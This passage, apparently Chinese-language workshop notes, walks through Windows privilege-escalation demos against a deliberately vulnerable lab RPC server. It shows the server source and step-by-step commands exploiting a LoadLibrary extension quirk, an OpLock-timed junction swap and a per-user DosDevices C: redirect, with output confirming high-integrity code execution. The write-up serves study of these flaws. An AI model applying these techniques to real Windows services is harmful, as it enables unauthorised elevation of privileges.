<span class="keyword">bool</span> ret = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (lStatus)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">case</span> ERROR_SUCCESS:</span><br><span class="line">    ret = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Error verifying file: %ls\n"</span>, GetErrorMessage(GetLastError()).c_str());</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过分析上面的源码，如果我们可以在 VerifyEmbeddedSignature() 调用时利用符号链接指向系统文件 verified.dll，但是在调用 LoadLibrary 时再修改指向我们可控的文件 evil.dll，那就可以成功了，如果在验证签名之后有机制可以回调通知我们，那就可以精确获得符号链接的替换时机。</p>
<h3 id="File-Directory-Change-Notify-文件变动通知"><a href="#File-Directory-Change-Notify-文件变动通知" class="headerlink" title="File/Directory Change Notify(文件变动通知)"></a>File/Directory Change Notify(文件变动通知)</h3><p>当文件名/目录/文件大小/属性/安全属性 发生变动时，可以通过 WaitForMultipleObjects 获得通知</p>
<p>参考 MSDN: <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa364417(v=vs.85).aspx" target="_blank" rel="noopener">FindFirstChangeNotification</a></p>
<p>这个的问题在于，通知只会在文件变动的时候触发，而 WinVerifyTrust 并不会触发。</p>
<h3 id="TOCTOU-不只是抢时间"><a href="#TOCTOU-不只是抢时间" class="headerlink" title="TOCTOU 不只是抢时间"></a>TOCTOU 不只是抢时间</h3><p>上面我一直从’抢时间’的角度来找方法，但是在 WinVerifyTrust() 之后到 LoadLibrary 的时间差很短，上面提到的 Access Callback 也没有找到，所以这个方法比较困难。</p>
<p>回去看了一下 James Forshaw 给的文档，他的利用方法很有意思，他利用的是系统 API WinVerifyTrust 和 LoadLibrary 处理文件名时的差异。</p>
<p>WinVerifyTrust() 接受的就是用户提供的路径，不会做任何处理，而 LoadLibrary 不一样，如果用户指定的路径不是以 dll 结尾，LoadLibrary 会尝试 ‘补’上一个 “.dll”。发现这个差异，利用方法也就有了。</p>
<p>注意 <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms684175(v=vs.85).aspx" target="_blank" rel="noopener">MSDN LoadLibrary</a> 中的这段文档，如果路径不是以 “.dll” 结尾，自动追加上 “.dll”。另外，如果不希望 LoadLibrary 自动追加 “.dll”，那在提供的路径后面追加一个 “.”，这个特性说不定什么时候也能被利用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If the string specifies a module name without a path and the file name extension is omitted, the function appends the default library extension .dll to the module name. To prevent the function from appending .dll to the module name, include a trailing point character (.) in the module name string.</span><br></pre></td></tr></table></figure>

<h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p>既然有了 LoadLibrary 这个比较 “周到” 的特性，那利用方法也就有了。</p>
<p>拷贝携带有效签名的 kernel32.dll 至我们的文件夹 c:\workshop\test\，重命名为 abc，即 c:\workshop\test\abc</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c:\workshop\ExploitTools&gt;CopyFile.exe c:\Windows\System32\kernel32.dll c:\workshop\test\abc</span><br><span class="line">Copied c:\Windows\System32\kernel32.dll to c:\workshop\test\abc</span><br></pre></td></tr></table></figure>

<p>拷贝我们的 evil.dll 至 c:\workshop\test\，重命名为 abc.dll，即 c:\workshop\test\abc.dll</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c:\workshop\ExploitTools&gt;CopyFile.exe c:\workshop\ExploitTools\TestDll32.dll c:\workshop\test\abc.dll</span><br><span class="line">Copied c:\workshop\ExploitTools\TestDll32.dll to c:\workshop\test\abc.dll</span><br></pre></td></tr></table></figure>

<p>DemoClient.exe 输入 c:\workshop\test\abc</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[RPC Tests]</span><br><span class="line">1 - Test Create Process</span><br><span class="line">2 - Test Load Library</span><br><span class="line">3 - Test Load Library with Path Check</span><br><span class="line">4 - Test Load Library TOCTOU</span><br><span class="line">5 - Test Load Library TOCTOU Hardened</span><br><span class="line">6 - Duplicate handle</span><br><span class="line">0 - Exit Menu</span><br><span class="line">Specify operation number: 4</span><br><span class="line"></span><br><span class="line">Specify library name: c:\workshop\test\abc</span><br></pre></td></tr></table></figure>

<p>RpcServer 弹框提示成功</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Hello From Process 1712</span><br><span class="line">Integrity: High</span><br><span class="line">UIAccess: false</span><br><span class="line">Elevated: true</span><br></pre></td></tr></table></figure>

<h2 id="8-DEMO-8-Symbolic-Link-TOCTOU"><a href="#8-DEMO-8-Symbolic-Link-TOCTOU" class="headerlink" title="8 DEMO 8 : Symbolic Link TOCTOU"></a>8 DEMO 8 : Symbolic Link TOCTOU</h2><p>这个 Case 是上一个的加强版，再次输入上面的 c:\workshop\test\abc，RpcServer 端提示错误：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Extension is:</span><br><span class="line">Invalid DLL extension</span><br></pre></td></tr></table></figure>

<p>看来是添加了对扩展名的检查</p>
<h3 id="8-1-源码"><a href="#8-1-源码" class="headerlink" title="8.1 源码"></a>8.1 源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> <span class="function">boolean <span class="title">TestLoadLibraryTocTouHardened</span><span class="params">(<span class="keyword">handle_t</span> hBinding, <span class="keyword">const</span> <span class="keyword">wchar_t</span>* lib_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  LPWSTR ext = PathFindExtensionW(lib_path);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Extension is: %ls\n"</span>, ext);</span><br><span class="line">  <span class="keyword">if</span> (ext == <span class="literal">nullptr</span> || _wcsicmp(ext, <span class="string">L".dll"</span>) != <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Invalid DLL extension %ls\n"</span>, ext);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Lock DLL file over calls.</span></span><br><span class="line">  <span class="function">ScopedHandle <span class="title">handle</span><span class="params">(CreateFile(lib_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_DELETE, <span class="literal">nullptr</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">nullptr</span>))</span></span>;</span><br><span class="line">  <span class="keyword">if</span> (handle.IsInvalid())</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Error opening dll file: %ls\n"</span>, GetErrorMessage(GetLastError()).c_str());</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!CheckFileIsInSystem(handle))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"File not in system directory\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  HMODULE hModule = LoadLibrary(lib_path);</span><br><span class="line">  <span class="keyword">if</span> (hModule != <span class="literal">nullptr</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Loaded module: %p\n"</span>, hModule);</span><br><span class="line">    FreeLibrary(hModule);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Error loading module: %ls\n"</span>, GetErrorMessage(GetLastError()).c_str());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">CheckFileIsInSystem</span><span class="params">(<span class="keyword">const</span> ScopedHandle&amp; handle)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  WCHAR path[MAX_PATH];</span><br><span class="line">  <span class="keyword">if</span> (GetFinalPathNameByHandleW(handle.Get(), path, MAX_PATH, <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Error checking executable file path: %ls\n"</span>, GetErrorMessage(GetLastError()).c_str());</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Referenced File is %ls\n"</span>, path);</span><br><span class="line">  PathRemoveFileSpec(path);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Directory is %ls\n"</span>, path);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::wstring system = GetPathFromEnv(IsWow64() ? FOLDERID_SystemX86 : FOLDERID_System);</span><br><span class="line">  system = <span class="string">L"\\\\?\\"</span> + system;</span><br><span class="line">  <span class="keyword">return</span> _wcsicmp(path, system.c_str()) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>源码中除了有后缀名 “.dll” 的检查，还有对文件路径 “C:\Windows\System32”  的检查</p>
<h3 id="8-2-为什么要-CreateFile-后检查-handle"><a href="#8-2-为什么要-CreateFile-后检查-handle" class="headerlink" title="8.2 为什么要 CreateFile 后检查 handle"></a>8.2 为什么要 CreateFile 后检查 handle</h3><p>CreateFile 之后再通过 handle 进一步检查，可以保证 CheckFileIsInSystem 中访问的文件与 CreateFile 中的参数是同一个文件。</p>
<h3 id="8-3-符号链接与文件替换"><a href="#8-3-符号链接与文件替换" class="headerlink" title="8.3 符号链接与文件替换"></a>8.3 符号链接与文件替换</h3><p>这个 Case 利用的利用方法是，使最终 LoadLibrary 的文件与前面检查的不是一个文件。利用到的技术有两个：OpLock 机会锁与符号连接。</p>
<p>创建指向 c:\Windows\System32 的符号链接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\workshop\ExploitTools&gt;mklink /J c:\workshop\test c:\windows\system32</span><br></pre></td></tr></table></figure>

<p>启动对目标文件的 OpLock，监控文件的读写行为，发生读写行为时会触发阻塞式的回调</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\workshop\ExploitTools&gt;start ..\symboliclink-testing-tools\SetOpLock.exe c:\Windows\System32\tapi32.dll x</span><br></pre></td></tr></table></figure>

<p>在 DemoClient 中输入 tapi32.dll 的新路径（也可以为其他文件名，要求 system32 目录下存在）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[RPC Tests]</span><br><span class="line">1 - Test Create Process</span><br><span class="line">2 - Test Load Library</span><br><span class="line">3 - Test Load Library with Path Check</span><br><span class="line">4 - Test Load Library TOCTOU</span><br><span class="line">5 - Test Load Library TOCTOU Hardened</span><br><span class="line">6 - Duplicate handle</span><br><span class="line">0 - Exit Menu</span><br><span class="line">Specify operation number: 5</span><br><span class="line"></span><br><span class="line">Specify library name: c:\workshop\test\tapi32.dll</span><br></pre></td></tr></table></figure>

<p>此时 RpcServer 中的 CreateFile 会触发 SetOpLock.exe 的监控，由于 RpcServer 中只有一次文件打开动作，后面都是通过 handle 来处理，所以处理的是 c:\windows\system32\tapi32.dll 的 handle。所以此时我们替换了 test 文件夹的符号链接目标，不再链接至 c:\Windows\System32。删除旧 test 文件夹，新建 test 文件夹，并且在其中拷贝一份我们的 evil.dll（修改文件名为 tapi32.dll）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c:\workshop\ExploitTools&gt; rmdir c:\workshop\test</span><br><span class="line">c:\workshop\ExploitTools&gt; mkdir c:\workshop\test</span><br><span class="line">c:\workshop\ExploitTools&gt; CopyFile.exe TestDll32.dll c:\workshop\test\tapi32.dll</span><br></pre></td></tr></table></figure>

<p>在 SetOpLock.exe 标准输入中，输入回车。</p>
<p>成功弹框提权后的 Hello 问候。</p>
<h3 id="8-4-OpLock"><a href="#8-4-OpLock" class="headerlink" title="8.4 OpLock"></a>8.4 OpLock</h3><p>OpLock 是冲突锁，当出现对文件操作的冲突时，就会触发 OpLock。</p>
<p>OpLock 本身是用于缓存文件加速网络访问效率而实现的。客户端程序通过 DeviceIoControl 与内核中的 OpLock 驱动模块交互。</p>
<p>客户端应用可以利用这个特性实现对文件的监控，尤其是 Io Code 为 FSCTL_REQUEST_OPLOCK_LEVEL_1 时。</p>
<p>参考 <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa364590(v=vs.85).aspx" target="_blank" rel="noopener">MSDN FSCTL_REQUEST_OPLOCK_LEVEL_1</a></p>
<p>在本例中，客户端对 tapi32.dll 注册 OpLock 时，服务端 CreateFile 时就会阻塞，此时客户端得到通知，替换 test 目录，不再指向 c:\windows\system32，然后继续执行。</p>
<p>服务端得到 c:\windows\system32\tapi32.dll 的 handle，所以后面判断路径时有效。而 LoadLibrary 时再次使用的 lib_path，但 lib_path 保存的是 c:\workshop\test\tapi32.dll，加载的是我们自己的 Evil.dll。</p>
<p>想到一个与本 Case 无关的问题，CreateFile 成功获得文件 handle 之后，文件能被删除吗？</p>
<p>如果 CreateFile 时指定的 dwShareMode 包含 FILE_SHARE_DELETE，那其他进程就可以删除此文件，只不过删除之后，通过当前 handle 对文件的读写操作就会返回失败。</p>
<h3 id="8-5-DEMO-7-TOCTOU-on-Name-有了新解"><a href="#8-5-DEMO-7-TOCTOU-on-Name-有了新解" class="headerlink" title="8.5 DEMO 7 TOCTOU on Name 有了新解"></a>8.5 DEMO 7 TOCTOU on Name 有了新解</h3><p>利用 OpLock 机制，Demo 7 的 TOCTOU Case 也有了新的解法。</p>
<ul>
<li>在 c:\workshop\test 符号链接指向 c:\windows\system32，然后对 c:\windows\system32\kernel32.dll 设置 OpLock</li>
<li>在 DemoClient 输入 c:\workshop\test\kernel32.dll，由于实际指向的时 c:\windows\system\kernel32.dll，所以签名验证通过。</li>
<li>触发 SetOpLock.exe 锁，删除 c:\workshop\test，新建 c:\workshop\test，拷贝 c:\workshop\ExploitTools\TestDll32.dll 为 c:\workshop\test\kernel32.dll</li>
<li>SetOpLock.exe 回车，释放锁。</li>
<li>成功弹框提权后的 Hello 问候。</li>
</ul>
<h2 id="9-DEMO-9-DosDevices-Redirect"><a href="#9-DEMO-9-DosDevices-Redirect" class="headerlink" title="9 DEMO 9 : DosDevices Redirect"></a>9 DEMO 9 : DosDevices Redirect</h2><h3 id="9-1-服务端源码"><a href="#9-1-服务端源码" class="headerlink" title="9.1 服务端源码"></a>9.1 服务端源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> <span class="function">boolean <span class="title">TestCreateProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	<span class="keyword">handle_t</span> hBinding)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"TestCreateProcess called\n"</span>);</span><br><span class="line">  RPC_STATUS status = RpcImpersonateClient(hBinding);</span><br><span class="line">  <span class="keyword">if</span> (status == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		STARTUPINFO startInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">		PROCESS_INFORMATION procInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">		startInfo.cb = <span class="keyword">sizeof</span>(startInfo);</span><br><span class="line">		WCHAR cmdline[] = <span class="string">L"c:\\windows\\notepad.exe"</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (CreateProcess(cmdline, cmdline, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>,</span><br><span class="line">			FALSE, <span class="number">0</span>, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>, &amp;startInfo, &amp;procInfo))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"Created Process: %d\n"</span>, procInfo.dwProcessId);</span><br><span class="line">			CloseHandle(procInfo.hThread);</span><br><span class="line">			CloseHandle(procInfo.hProcess);</span><br><span class="line">      RpcRevertToSelf();</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"Error creating process: %d\n"</span>, GetLastError());</span><br><span class="line">      RpcRevertToSelf();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Error impersonating user: %d\n"</span>, status);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，服务端模拟 ALPC 客户端的身份，启动了 notepad.exe 进程。</p>
<p>我们的目标就是绕过限制，启动自己的进程，甚至是启动高权限进程。</p>
<h3 id="9-2-RpcImpersonateClient-与-CreateProcess"><a href="#9-2-RpcImpersonateClient-与-CreateProcess" class="headerlink" title="9.2 RpcImpersonateClient 与 CreateProcess"></a>9.2 RpcImpersonateClient 与 CreateProcess</h3><p>RpcImpersonateClient 可以为当前线程创建一个 Impersonation 的身份，使当前服务端线程拥有客户端的 impersonation token，之后当前线程在调用某些 API 时就会以 impersonation token 身份验证权限。</p>
<p>CreateProcess 用于创建新进程，如果一个具有 impersonation token 的进程调用 CreateProcess 时，新进程会继承哪个 Token 呢？ server primary token 还是 impersonation token？</p>
<p>可惜，是 server primary token。不过系统也提供了用于指定用户的 CreateProcess 版本 - CreateProcessAsUser。CreateProcessAsUser 可以通过指定 Token，代表用某个用户的身份创建进程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL WINAPI <span class="title">CreateProcessAsUser</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_opt_    HANDLE                hToken,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_opt_    LPCTSTR               lpApplicationName,</span></span></span><br><span class="line"><span class="function"><span class="params">  _Inout_opt_ LPTSTR                lpCommandLine,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_opt_    LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_opt_    LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_        BOOL                  bInheritHandles,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_        DWORD                 dwCreationFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_opt_    LPVOID                lpEnvironment,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_opt_    LPCTSTR               lpCurrentDirectory,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_        LPSTARTUPINFO         lpStartupInfo,</span></span></span><br><span class="line"><span class="function"><span class="params">  _Out_       LPPROCESS_INFORMATION lpProcessInformation</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>所以 RpcImpersonateClient 应该和 CreateProcessAsUser 配套使用，如果和 CreateProcess 一起使用，就容易出现身份不一致的问题。</p>
<p>在本 Case 中，正好可以验证一下，管理员权限打开 Sysinternals 工具集中的 Process Explorer，重复本 Case 中的测试过程，管理员权限打开 RpcServer.exe，普通用户权限打开 DemoClient-&gt;Rpc Client Test-&gt;ALPC-&gt;Test Create Process。</p>
<p>在 Process Explorer 选择展示 Intergrity Level 和 User 列，然后对比 RpcServer、DemoClient、notepad，发现 notepad 进程的启动用户和 Integrity Level 与 RpcServer 完全一致，Intergrity Level 均为 High，而 DemoClient 的 Intergrity Level 为 Medium。</p>
<p>参考:</p>
<ul>
<li><p><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms682429(v=vs.85).aspx" target="_blank" rel="noopener">MSDN CreateProcessAsUser</a></p>
</li>
<li><p><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa446617(v=vs.85).aspx" target="_blank" rel="noopener">MSDN DuplicateTokenEx</a></p>
</li>
<li><p><a href="http://winapi.freetechsecrets.com/win32/WIN32Impersonation.htm" target="_blank" rel="noopener">Win32 WIN32Impersonation</a></p>
</li>
</ul>
<p>有了这个问题，看来权限问题就不用解决了，剩下的就看如何来让 CreateProcess 创建的是我们可控的程序，直接替换 c:\system32\notepad.exe 文件肯定是不行的，权限不够，与 Impersonation 结合呢？</p>
<h3 id="与-GLOBAL"><a href="#与-GLOBAL" class="headerlink" title="??\ 与 \GLOBAL??\"></a>??\ 与 \GLOBAL??\</h3><p>对象管理器中，\DosDevices 下面保存着驱动创建的有名字的设备对象（方便暴露给用户态？）。为了隔离不同的用户会话，对象管理器对其中的 \DosDevices、\Windows、\BaseNamedObjects 隔离实例化，有一份全局的，然后每个用户也可以有一份属于自己的，并且自己的那份会 shadow 掉全局的，所以对这几个命名空间的修改只会影响自己。</p>
<p>\GLOBAL??\ 是指向全局 \DosDevices 的符号链接，\DosDevices 命名空间下保存着如 C:、COM1 等设备的符号链接，这些符号链接指向 \Devices 命名空间中的真实设备</p>
<p>??\ 比较特殊，它是个前缀，不是实际的命名空间。当对象管理器发现应用传递的路径以 ?? 为前缀时就会进入到查找私有 \DosDevices 命名空间的流程，首先从进程 EPROCESS 的 DeviceMap 开始，DeviceMap 的 DosDevicesDirectory 指向进程私有的 \DosDevices 命名空间，如果在这个私有 \DosDevices 没找到我们的目标对象，就会继续根据 DeviceMap 的 GlobalDosDevicesDirectory 查找，GlobalDosDevicesDirectory 总是指向 \GLOBAL??\</p>
<p>参考： [Windows Internals 7th Edition 第三章 Seesion Namespace 小结]</p>
<h3 id="利用-创建假-c-windows"><a href="#利用-创建假-c-windows" class="headerlink" title="利用 ??\ 创建假 c:\windows\"></a>利用 ??\ 创建假 c:\windows\</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// 创建假的 windows 目录</span><br><span class="line">c:\workshop\symboliclink-testing-tools&gt;mkdir c:\demo9\windows</span><br><span class="line"></span><br><span class="line">// 拷贝希望被执行的 evil 程序，注意名字需要为 notepad.exe</span><br><span class="line">c:\workshop\symboliclink-testing-tools&gt;C:\workshop\ExploitTools\CopyFile   C:\workshop\ExploitTools\DummyExe.exe   c:\demo9\windows\notepad.exe</span><br><span class="line"></span><br><span class="line">// 启动管理员权限的 RpcServer.exe 和普通权限的 DemoClient.exe</span><br><span class="line">// 命令略</span><br><span class="line"></span><br><span class="line">// 关键一步，创建对象管理器中的符号链接，使私有 \DosDevices 中 c: 设备，指向 \GLOBAL??\C:\demo9，执行之后 c:\windows 就会指向以前的 C:\demo9\windows，而 c:\ 会发现只有 notepad.exe 和 windows。</span><br><span class="line"></span><br><span class="line">c:\workshop\symboliclink-testing-tools&gt;CreateNativeSymlink.exe   \??\C:   \GLOBAL??\C:\demo9</span><br><span class="line">Opened Link \??\C: -&gt; \GLOBAL??\C:\demo9: 00000070</span><br><span class="line">Press ENTER to exit and delete the symlink</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// DemoClient.exe 开始测试创建进程</span><br><span class="line">[RPC Tests]</span><br><span class="line">1 - Test Create Process</span><br><span class="line">2 - Test Load Library</span><br><span class="line">3 - Test Load Library with Path Check</span><br><span class="line">4 - Test Load Library TOCTOU</span><br><span class="line">5 - Test Load Library TOCTOU Hardened</span><br><span class="line">6 - Duplicate handle</span><br><span class="line">0 - Exit Menu</span><br><span class="line">Specify operation number: 1</span><br><span class="line"></span><br><span class="line">* 成功弹框提权后的 Hello 问候，High Integrity Level。</span><br></pre></td></tr></table></figure>

<p>本例中，没有执行实验文档中的 CreateMountPoint，发现仍然成功了，猜测教程中执行 CreateMountPoint 的原因是：我们的 c:\demo9\windows 假目录下没有 system32，可能会影响某些程序的执行。所以用 CreateMountPoint 提前创建挂载点，保证 system32 的正常文件访问，某些程序的依赖 dll 能够正常加载。</p>
<p>根据我以 calc.exe 实际测试，发现即便创建了挂载点也不能弹出计算器，会提示并行配置错误，这个暂时不深究了。</p>
<p>如果创建了 MountPoint，如何删除？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\workshop\symboliclink-testing-tools&gt;DeleteMountPoint.exe c:\demo9\Windows\system32</span><br></pre></td></tr></table></figure>

<h3 id="为什么没有创建-CreateNativeSymlink-exe-C-windows-GLOBAL-C-demo9-windows"><a href="#为什么没有创建-CreateNativeSymlink-exe-C-windows-GLOBAL-C-demo9-windows" class="headerlink" title="为什么没有创建 CreateNativeSymlink.exe   ??\C:\windows   \GLOBAL??\C:\demo9\windows"></a>为什么没有创建 CreateNativeSymlink.exe   ??\C:\windows   \GLOBAL??\C:\demo9\windows</h3><p>测试了一下，会失败，而且 Last Error Message 为空，猜测原因是：创建 ??\C:\windows 符号链接时，??\C: 已经是符号链接了，所以不允许为符号链接创建子级符号链接。</p>
